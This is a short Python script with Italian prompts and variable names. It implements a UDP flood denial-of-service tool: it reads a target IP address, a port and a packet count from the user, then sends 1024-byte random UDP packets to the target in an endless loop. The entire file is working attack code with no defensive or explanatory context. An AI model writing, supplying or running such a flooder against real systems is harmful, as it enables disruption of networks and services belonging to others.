import random
import socket

def UDP_flood():
    dati_da_inviare = random._urandom(1024)
    while True:
        for x in range(numero_pacchetti):
            s.sendto(dati_da_inviare, target)
            print("#",x,"-UDP inviato\n")

indirizzo_ip = str(input("Inserisci l'indirizzo IP target:"))
porta = int(input("Inserisci la porta:"))
numero_pacchetti = int(input("Inserisci il numero di pacchetti da inviare:"))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (str(indirizzo_ip),int(porta))

except:
    s.close()
    print("[!] Error!")


UDP_flood()
